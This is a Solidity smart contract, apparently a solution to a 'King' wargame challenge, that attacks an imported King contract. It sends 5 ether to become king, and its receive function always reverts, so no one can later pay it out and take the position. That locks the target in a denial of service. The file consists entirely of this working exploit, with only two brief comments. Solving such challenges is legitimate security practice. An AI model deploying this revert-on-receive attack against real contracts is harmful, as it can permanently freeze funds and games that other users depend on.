// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        //Sending 5 eth to become king 
        payable(contractAddress).call{value : 5 ether}("");
    }

    receive() external payable {
        //Reverting transaction when the contract receives eth.
        require(false,"Not today");
    }
}
